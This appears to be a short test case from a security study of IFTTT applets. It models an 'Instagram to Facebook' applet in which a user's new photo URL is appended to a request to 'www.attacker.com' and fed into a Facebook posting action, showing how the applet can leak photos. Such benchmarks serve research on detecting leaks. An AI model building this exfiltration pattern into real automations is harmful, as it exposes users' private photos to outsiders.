// Title: Automatically share your Instagrams to Facebook
// Maker: rsms
// Link : https://ifttt.com/applets/507p-automatically-share-your-instagrams-to-facebook

// Trigger: Instagram -> Any new photo by you
// Action : Facebook -> ... 

// Policy/Presence: Confidentiality of user photos / No

url = lbl("Instagram.anyNewPhotoByYou.Url");
attack = urll("www.attacker.com?" + url);
sink('FacebookPages.createPhotoPage', 'setPhotoUrl', attack);
